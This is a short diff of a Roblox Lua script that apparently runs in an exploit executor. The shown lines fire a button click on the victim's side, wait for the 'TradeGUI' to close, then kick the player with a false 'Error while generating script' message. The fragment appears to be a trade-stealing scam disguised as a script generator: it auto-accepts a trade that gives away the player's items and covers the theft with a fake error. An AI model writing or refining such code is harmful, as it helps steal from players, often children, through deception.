@@ -247,7 +247,7 @@ plr:Kick("We do not whitelist alt accounts, please join with a elegible account"
 end
 
 firesignal(acc.MouseButton1Click)
-repeat wait(1) print(gui) until gui == nil
+repeat wait(1) local gui = plr.PlayerGui:FindFirstChild("TradeGUI") until gui == nil
 plr:Kick("Error while generating script, please rejoin")
 elseif game.Workspace:FindFirstChild("CamParts") then
 local servercode = "KF4X5T2yeG"
